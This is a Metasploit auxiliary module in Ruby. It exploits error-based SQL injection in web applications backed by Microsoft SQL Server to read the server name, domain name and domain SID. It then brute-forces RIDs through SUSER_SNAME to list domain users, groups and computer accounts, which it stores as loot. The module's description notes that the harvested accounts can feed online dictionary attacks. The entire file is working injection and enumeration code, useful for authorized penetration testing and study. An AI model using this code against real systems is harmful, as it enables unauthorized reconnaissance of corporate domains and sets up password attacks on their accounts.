##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/mssql_commands'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MSSQL_SQLI
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Microsoft SQL Server - SQLi SUSER_SNAME Domain Account Enumeration',
      'Description' => %q{
        This module can be used to brute force RIDs associated with the domain of the SQL Server
        using the SUSER_SNAME function via Error Based SQL injection. This is similar to the
        smb_lookupsid module, but executed through SQL Server queries as any user with the PUBLIC
        role (everyone). Information that can be enumerated includes Windows domain users, groups,
        and computer accounts.  Enumerated accounts can then be used in online dictionary attacks.
        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
      },
      'Author'         =>
        [
          'nullbind <scott.sutherland[at]netspi.com>',
          'antti <antti.rantasaari[at]netspi.com>'
        ],
      'License'     => MSF_LICENSE,
      'References'  => [[ 'URL','http://msdn.microsoft.com/en-us/library/ms174427.aspx']]
      ))

    register_options(
    [
      OptInt.new('FuzzNum', [true, 'Number of principal_ids to fuzz.', 3000])
    ], self.class)
  end

  def run

    print_status("#{peer} - Grabbing the server and domain name...")
    db_server_name = get_server_name
    if db_server_name.nil?
      print_error("#{peer} - Unable to grab the server name")
      return
    else
      print_good("#{peer} - Server name: #{db_server_name}")
    end

    db_domain_name = get_domain_name
    if db_domain_name.nil?
      print_error("#{peer} - Unable to grab domain name")
      return
    end

    # Check if server is on a domain
    if db_server_name == db_domain_name
      print_error("#{peer} - The SQL Server does not appear to be part of a Windows domain")
      return
    else
      print_good("#{peer} - Domain name: #{db_domain_name}")
    end

    print_status("#{peer} - Grabbing the SID for the domain...")
    windows_domain_sid = get_windows_domain_sid(db_domain_name)
    if windows_domain_sid.nil?
      print_error("#{peer} - Could not recover the SQL Server's domain sid.")
      return
    else
      print_good("#{peer} - Domain sid: #{windows_domain_sid}")
    end

    # Get a list of windows users, groups, and computer accounts using SUSER_NAME()
    print_status("#{peer} - Brute forcing #{datastore['FuzzNum']} RIDs through the SQL Server, be patient...")
    domain_users = get_win_domain_users(windows_domain_sid)
    if domain_users.nil?
      print_error("#{peer} - Sorry, no Windows domain accounts were found, or DC could not be contacted.")
      return
    end

    # Print number of objects found and write to a file
    print_good("#{peer} - #{domain_users.length} user accounts, groups, and computer accounts were found.")

    domain_users.sort.each do |windows_login|
      vprint_status(" - #{windows_login}")
    end

    # Create table for report
    windows_domain_login_table = Rex::Ui::Text::Table.new(
      'Header'  => 'Windows Domain Accounts',
      'Ident'   => 1,
      'Columns' => ['name']
    )

    # Add brute forced names to table
    domain_users.each do |object_name|
      windows_domain_login_table << [object_name]
    end

    # Create output file
    this_service = report_service(
      :host  => rhost,
      :port => rport,
      :name => 'mssql',
      :proto => 'tcp'
    )
    filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_windows_domain_accounts.csv"
    path = store_loot(
      'mssql.domain.accounts',
      'text/plain',
      datastore['RHOST'],
      windows_domain_login_table.to_csv,
      filename,
      'SQL Server query results',
      this_service
    )
    print_status("Query results have been saved to: #{path}")
  end

  # Get the server name
  def get_server_name
    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
    sql = "(select '#{clue_start}'+@@servername+'#{clue_end}')"

    result = mssql_query(sql)

    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
      instance_name = $1
      sql_server_name = instance_name.split('\\')[0]
    else
      sql_server_name = nil
    end

    sql_server_name
  end

  # Get the domain name of the SQL Server
  def get_domain_name
    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
    sql = "(select '#{clue_start}'+DEFAULT_DOMAIN()+'#{clue_end}')"

    result = mssql_query(sql)

    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
      domain_name = $1
    else
      domain_name = nil
    end

    domain_name
  end

  # Get the SID for the domain
  def get_windows_domain_sid(db_domain_name)
    domain_group = "#{db_domain_name}\\Domain Admins"

    clue_start = Rex::Text.rand_text_alpha(8)
    clue_end = Rex::Text.rand_text_alpha(8)

    sql = "(select cast('#{clue_start}'+(select stuff(upper(sys.fn_varbintohexstr((SELECT SUSER_SID('#{domain_group}')))), 1, 2, ''))+'#{clue_end}' as int))"

    result = mssql_query(sql)

    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
      object_sid = $1
      domain_sid = object_sid[0..47]
      return nil if domain_sid.empty?
    else
      domain_sid = nil
    end

    domain_sid
  end

  # Get list of windows accounts, groups and computer accounts
  def get_win_domain_users(windows_domain_sid)
    clue_start = Rex::Text.rand_text_alpha(8)
    clue_end = Rex::Text.rand_text_alpha(8)

    windows_logins = []

    # Fuzz the principal_id parameter (RID in this case) passed to the SUSER_NAME function
    (500..datastore['FuzzNum']).each do |principal_id|

      if principal_id % 100 == 0
        print_status("#{peer} - Querying SID #{principal_id} of #{datastore['FuzzNum']}")
      end

      # Convert number to hex and fix order
      principal_id_hex = "%02X" % principal_id
      principal_id_hex_pad = (principal_id_hex.size.even? ? principal_id_hex : ("0"+ principal_id_hex))
      principal_id_clean  = principal_id_hex_pad.scan(/(..)/).reverse.flatten.join

      # Add padding
      principal_id_hex_padded2 = principal_id_clean.ljust(8, '0')

      # Create full sid
      win_sid = "0x#{windows_domain_sid}#{principal_id_hex_padded2}"

      # Return if sid does not resolve correctly for a domain
      if win_sid.length < 48
        return nil
      end

      sql = "(SELECT '#{clue_start}'+(SELECT SUSER_SNAME(#{win_sid}) as name)+'#{clue_end}')"

      result = mssql_query(sql)

      if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
        windows_login = $1

        if windows_login.length != 0
          print_status("#{peer} -  #{windows_login}")
          windows_logins.push(windows_login) unless windows_logins.include?(windows_login)
          # Verbose output
          vprint_status("#{peer} - Test sid: #{win_sid}")
        end
      end

    end

    windows_logins
  end

end
